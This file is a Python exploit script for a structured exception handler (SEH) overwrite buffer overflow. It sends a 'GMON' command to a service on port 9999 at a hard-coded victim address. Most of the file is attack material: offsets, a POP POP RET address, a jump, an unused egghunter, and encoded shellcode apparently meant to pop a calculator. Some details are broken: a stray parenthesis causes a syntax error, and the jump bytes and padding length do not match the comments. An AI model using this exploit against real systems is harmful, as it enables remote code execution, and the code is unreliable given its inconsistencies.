#!/usr/bin/python

import socket
import os
import sys

victim_host = "10.0.0.213"
port = 9999

# SEH overwritten - 45336E45
# [*] Exact match at offset 3519
# JMP - \xEB\x80\x90\x90
#pop pop ret - 625010B4

pop_calc  = ""
pop_calc += "\xba\x0b\x9e\x15\x45\xd9\xc6\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
pop_calc += "\x31\x31\x50\x13\x03\x50\x13\x83\xe8\xf7\x7c\xe0\xb9\xef\x03"
pop_calc += "\x0b\x42\xef\x63\x85\xa7\xde\xa3\xf1\xac\x70\x14\x71\xe0\x7c"
pop_calc += "\xdf\xd7\x11\xf7\xad\xff\x16\xb0\x18\x26\x18\x41\x30\x1a\x3b"
pop_calc += "\xc1\x4b\x4f\x9b\xf8\x83\x82\xda\x3d\xf9\x6f\x8e\x96\x75\xdd"
pop_calc += "\x3f\x93\xc0\xde\xb4\xef\xc5\x66\x28\xa7\xe4\x47\xff\xbc\xbe"
pop_calc += "\x47\x01\x11\xcb\xc1\x19\x76\xf6\x98\x92\x4c\x8c\x1a\x73\x9d"
pop_calc += "\x6d\xb0\xba\x12\x9c\xc8\xfb\x94\x7f\xbf\xf5\xe7\x02\xb8\xc1"
pop_calc += "\x9a\xd8\x4d\xd2\x3c\xaa\xf6\x3e\xbd\x7f\x60\xb4\xb1\x34\xe6"
pop_calc += "\x92\xd5\xcb\x2b\xa9\xe1\x40\xca\x7e\x60\x12\xe9\x5a\x29\xc0"
pop_calc += "\x90\xfb\x97\xa7\xad\x1c\x78\x17\x08\x56\x94\x4c\x21\x35\xf2"
pop_calc += "\x93\xb7\x43\xb0\x94\xc7\x4b\xe4\xfc\xf6\xc0\x6b\x7a\x07\x03"
pop_calc += "\xc8\x74\x4d\x0e\x78\x1d\x08\xda\x39\x40\xab\x30\x7d\x7d\x28"
pop_calc += "\xb1\xfd\x7a\x30\xb0\xf8\xc7\xf6\x28\x70\x57\x93\x4e\x27\x58"
pop_calc += "\xb6\x2c\xa6\xca\x5a\x9d\x4d\x6b\xf8\xe1")

egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter +="\xef\xb8\x4e\x55\x31\x31\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

#egghunter value = NU11NU11

payload = "A" * 3515 
payload += "\x71\x80\x70\x80" #nSeh with backwards jump
payload += "\xB4\x10\x50\x62" #Seh with POP POP RET
payload +="\x90"*16 + pop_calc + "C" * 3000
#bad chars - \x00

buffer_exploit = "GMON /.:/" + payload

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((victim_host, port))
expl.send(buffer_exploit)
print("[x] Sent malicious payload to to victim host")
print("[!] You may need to send it multiple times")
expl.close()
